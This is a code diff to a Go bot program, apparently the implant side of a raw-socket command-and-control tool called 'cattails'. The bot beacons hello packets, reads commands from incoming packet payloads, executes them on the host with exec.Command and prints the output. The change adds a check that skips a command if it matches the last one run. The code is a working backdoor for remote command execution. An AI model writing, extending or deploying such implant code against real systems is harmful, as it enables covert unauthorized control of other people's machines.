@@ -13,6 +13,8 @@ import (
 	"golang.org/x/sys/unix"
 )
 
+var lastCmdRan string
+
 func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
 	for {
 		fd := cattails.NewSocket()
@@ -32,6 +34,7 @@ func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.Hardware
 func botProcessPacket(packet gopacket.Packet) {
 
 	fmt.Println("[+] Payload Received")
+
 	data := string(packet.ApplicationLayer().Payload())
 	data = strings.Trim(data, "\n")
 
@@ -40,12 +43,18 @@ func botProcessPacket(packet gopacket.Packet) {
 	command := payload[1]
 	args := payload[2:]
 
-	fmt.Println("[+] ARGS:", args)
-	out, err := exec.Command(command, args...).Output()
-	if err != nil {
-		fmt.Println("\n[-] ERROR:", err)
+	// Only run command if we didn't just run it
+	if lastCmdRan != command {
+		fmt.Println("[+] ARGS:", args)
+		out, err := exec.Command(command, args...).Output()
+		if err != nil {
+			fmt.Println("\n[-] ERROR:", err)
+		}
+		lastCmdRan = command
+		fmt.Println("[+] OUTPUT:", string(out))
+	} else {
+		fmt.Println("[!] Already ran command", command)
 	}
-	fmt.Println("[+] OUTPUT:", string(out))
 }
 
 func main() {
@@ -54,6 +63,7 @@ func main() {
 
 	readfd := cattails.NewSocket()
 	defer unix.Close(readfd)
+
 	fmt.Println("[+] Socket created")
 
 	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
